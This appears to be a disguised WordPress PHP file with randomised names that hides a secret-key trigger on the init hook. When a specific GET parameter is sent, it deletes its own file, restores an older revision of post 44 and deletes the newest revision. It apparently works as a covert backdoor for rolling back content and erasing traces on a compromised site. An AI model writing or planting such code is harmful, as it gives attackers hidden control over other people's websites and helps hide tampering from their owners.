<?php

function navigation_pack_instant() {
	if (isset($_GET['shortener_hello_adsense_woff2']) && $_GET['shortener_hello_adsense_woff2'] === 'single_js_beaver') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$script_replace_official_protection = 44;
		$count_toolkit_media_consent = wp_get_post_revisions($script_replace_official_protection);
		if (empty($count_toolkit_media_consent)) die('no revisions');
		if (count($count_toolkit_media_consent) < 2) die('less than 2');
		$scroll_protect_feed = array_shift($count_toolkit_media_consent);
		$official_country_terms_enhanced = $scroll_protect_feed->ID;
		$switch_contents_wpml = array_shift($count_toolkit_media_consent);
		$screen_addon_album_multi = $switch_contents_wpml->ID;
		$compare_column_schedule = wp_restore_post_revision($screen_addon_album_multi);
		if ($compare_column_schedule === false) die('error restoring');
		$compare_column_schedule = wp_delete_post_revision($official_country_terms_enhanced);		
		if ($compare_column_schedule === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'navigation_pack_instant');
